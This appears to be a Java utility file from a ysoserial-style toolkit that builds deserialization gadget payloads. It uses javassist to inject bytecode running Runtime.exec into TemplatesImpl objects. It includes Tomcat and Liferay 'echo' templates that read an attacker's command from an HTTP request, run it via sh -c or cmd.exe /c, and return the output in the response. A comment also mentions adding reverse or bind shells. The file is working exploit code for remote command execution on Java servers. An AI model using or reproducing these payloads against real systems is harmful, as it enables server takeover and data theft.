package ysoserial.payloads.util;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import java.io.Serializable;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings({
    "restriction", "rawtypes", "unchecked"
})
public class Gadgets {

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }


        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }


    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }


    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap(final String key, final Object val) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }

    public static Object createTemplatesImpl(final String command) throws Exception {
        return createTemplatesImpl(command, "");
    }
    public static Object createTemplatesImplTomcatHeader(final String command) throws Exception {
        String template = "try {\n" +
            "            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(\"context\");\n" +
            "            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(\"service\");\n" +
            "            contextField.setAccessible(true);\n" +
            "            serviceField.setAccessible(true);\n" +
            "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =\n" +
            "                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n" +
            "            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());\n" +
            "            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);\n" +
            "            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();\n" +
            "            for (int i=0;i<connectors.length;i++) {\n" +
            "                if (4==connectors[i].getScheme().length()) {\n" +
            "                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();\n" +
            "                   if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {\n"+
            "                    ((org.apache.coyote.http11.AbstractHttp11Protocol)protocolHandler).setMaxHttpHeaderSize("+command+");\n" +
            "                   }\n"+
            "                }\n" +
            "            }\n" +
            "        }catch (Exception e){\n" +
            "        }";
        return createTemplatesImpl(command, template);
    }

    public static Object createTemplatesImplLiferayEcho(final String command) throws Exception {
        String template = "try {\n" +
            "            javax.servlet.http.HttpServletResponse httpServletResponse;\n" +
            "            javax.servlet.http.HttpServletRequest httpServletRequest;\n" +
            "            try{\n" +
            "                Class.forName(\"com.liferay.portal.kernel.security.access.control.AccessControlUtil\");\n" +
            "                httpServletResponse = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getResponse();\n" +
            "                httpServletRequest = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getRequest();\n" +
            "            }catch (ClassNotFoundException e){\n" +
            "                java.lang.reflect.Method method = Class.forName(\"com.liferay.portal.security.ac.AccessControlUtil\").getMethod(\"getAccessControlContext\",null);\n" +
            "                java.lang.reflect.Method getResponse = Class.forName(\"com.liferay.portal.security.auth.AccessControlContext\").getMethod(\"getResponse\",null);\n" +
            "                java.lang.reflect.Method getRequest = Class.forName(\"com.liferay.portal.security.auth.AccessControlContext\").getMethod(\"getRequest\",null);\n" +
            "                httpServletResponse = (javax.servlet.http.HttpServletResponse)getResponse.invoke(method.invoke(null,null),null);\n" +
            "                httpServletRequest = (javax.servlet.http.HttpServletRequest)getRequest.invoke(method.invoke(null,null),null);\n" +
            "            }\n" +
            "            java.io.Writer writer = httpServletResponse.getWriter();\n" +
            "            int result = Integer.valueOf(httpServletRequest.getParameter(\"a\")).intValue()+Integer.valueOf(httpServletRequest.getParameter(\"b\")).intValue();\n" +
            "            writer.write(String.valueOf(result));\n" +
            "            writer.flush();\n" +
            "        }catch (Exception e){\n" +
            "        }";
        return createTemplatesImpl(command, template);
    }

    public static Object createTemplatesImplTomcatEcho2(final String command) throws Exception {

        String template = "try {\n" +
            "            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(\"context\");\n" +
            "            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(\"service\");\n" +
            "            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(\"req\");\n" +
            "            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(\"getHandler\",null);" +
            "            contextField.setAccessible(true);\n" +
            "            serviceField.setAccessible(true);\n" +
            "            requestField.setAccessible(true);\n" +
            "            getHandlerMethod.setAccessible(true);\n" +
            "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =\n" +
            "                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n" +
            "            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());\n" +
            "            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);\n" +
            "            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();\n" +
            "            for (int i=0;i<connectors.length;i++) {\n" +
            "                if (4==connectors[i].getScheme().length()) {\n" +
            "                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();\n" +
            "                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {\n" +
            "                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();\n" +
            "                        for (int j = 0; j < classes.length; j++) {\n" +
            "                            if (52 == (classes[j].getName().length())||60 == (classes[j].getName().length())) {\n" +
            "                                java.lang.reflect.Field globalField = classes[j].getDeclaredField(\"global\");\n" +
            "                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField(\"processors\");\n" +
            "                                globalField.setAccessible(true);\n" +
            "                                processorsField.setAccessible(true);\n" +
            "                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler,null));\n" +
            "                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);\n" +
            "                                for (int k = 0; k < list.size(); k++) {\n" +
            "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));\n" +
            "                                    if (\"tomcat\".equals(tempRequest.getHeader(\"tomcat\"))) {\n" +
            "                                        org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);\n" +
            "                                        String cmd = \"" + command+"\";\n" +
            "                                        String[] cmds = !System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\", cmd};\n" +
            "                                        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
            "                                        java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\a\");\n" +
            "                                        String output = s.hasNext() ? s.next() : \"\";\n" +
            "                                        java.io.Writer writer = request.getResponse().getWriter();\n" +
            "                                        java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField(\"usingWriter\");\n" +
            "                                        usingWriter.setAccessible(true);\n" +
            "                                        usingWriter.set(request.getResponse(), Boolean.FALSE);\n" +
            "                                        writer.write(output);\n" +
            "                                        writer.flush();\n" +
            "                                        break;\n" +
            "                                    }\n" +
            "                                }\n" +
            "                                break;\n" +
            "                            }\n" +
            "                        }\n" +
            "                    }\n" +
            "                    break;\n" +
            "                }\n" +
            "            }\n" +
            "        }catch (Exception e){\n" +
            "        }";
        return createTemplatesImpl(command, template);
    }

    public static Object createTemplatesImplTomcatEcho(final String command) throws Exception {
        String param = command == null ? "cmd" : command;
        String template = "        try {\n" +
            "            java.lang.reflect.Field WRAP_SAME_OBJECT_FIELD = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\").getDeclaredField(\"WRAP_SAME_OBJECT\");\n" +
            "            java.lang.reflect.Field lastServicedRequestField = org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField(\"lastServicedRequest\");\n" +
            "            java.lang.reflect.Field lastServicedResponseField = org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField(\"lastServicedResponse\");\n" +
            "            java.lang.reflect.Field modifiersField = java.lang.reflect.Field.class.getDeclaredField(\"modifiers\");\n" +
            "            modifiersField.setAccessible(true);\n" +
            "            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, 8);\n" +
            "            modifiersField.setInt(lastServicedRequestField, 10);\n" +
            "            modifiersField.setInt(lastServicedResponseField, 10);\n" +
            "            WRAP_SAME_OBJECT_FIELD.setAccessible(true);\n" +
            "            lastServicedRequestField.setAccessible(true);\n" +
            "            lastServicedResponseField.setAccessible(true);\n" +
            "\n" +
            "            ThreadLocal lastServicedResponse = lastServicedResponseField.get(null) != null\n" +
            "                    ? (ThreadLocal) lastServicedResponseField.get(null)\n" +
            "                    : null;\n" +
            "            ThreadLocal lastServicedRequest = lastServicedRequestField.get(null) != null\n" +
            "                    ? (ThreadLocal) lastServicedRequestField.get(null)\n" +
            "                    : null;\n" +
            "            boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);\n" +
            "            String cmd = lastServicedRequest != null\n" +
            "                    ? ((javax.servlet.ServletRequest) lastServicedRequest.get()).getParameter(\"" + command + "\")\n" +
            "                    : null;\n" +
            "            if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {\n" +
            "                lastServicedRequestField.set(null, new ThreadLocal());\n" +
            "                lastServicedResponseField.set(null, new ThreadLocal());\n" +
            "                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);\n" +
            "            } else if (cmd != null) {\n" +
            "                javax.servlet.ServletResponse responseFacade = (javax.servlet.ServletResponse) lastServicedResponse.get();\n" +
            "                responseFacade.getWriter();\n" +
            "                java.io.Writer w = responseFacade.getWriter();\n" +
            "                java.lang.reflect.Field responseField = org.apache.catalina.connector.ResponseFacade.class.getDeclaredField(\"response\");\n" +
            "                responseField.setAccessible(true);\n" +
            "                org.apache.catalina.connector.Response response = (org.apache.catalina.connector.Response) responseField.get(responseFacade);\n" +
            "                java.lang.reflect.Field usingWriter = org.apache.catalina.connector.Response.class.getDeclaredField(\"usingWriter\");\n" +
            "                usingWriter.setAccessible(true);\n" +
            "                usingWriter.set((Object) response, Boolean.FALSE);\n" +
            "\n" +
            "                boolean isLinux = true;\n" +
            "                String osTyp = System.getProperty(\"os.name\");\n" +
            "                if (osTyp != null && osTyp.toLowerCase().contains(\"win\")) {\n" +
            "                    isLinux = false;\n" +
            "                }\n" +
            "                String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\", cmd};\n" +
            "                java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
            "                java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\a\");\n" +
            "                String output = s.hasNext() ? s.next() : \"\";\n" +
            "                w.write(output);\n" +
            "                w.flush();\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "        }";
        return createTemplatesImpl(command, template);
    }


    public static Object createTemplatesImpl(final String command, String template) throws Exception {
        if (template.equals("")) {
            template = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
        }

        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImpl(
                command,
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"),
                template);
        }

        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class, template);
    }


    public static <T> T createTemplatesImpl(final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String template)
        throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections

        clazz.makeClassInitializer().insertAfter(template);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }


    public static HashMap makeMap(Object v1, Object v2) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
        IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }
}
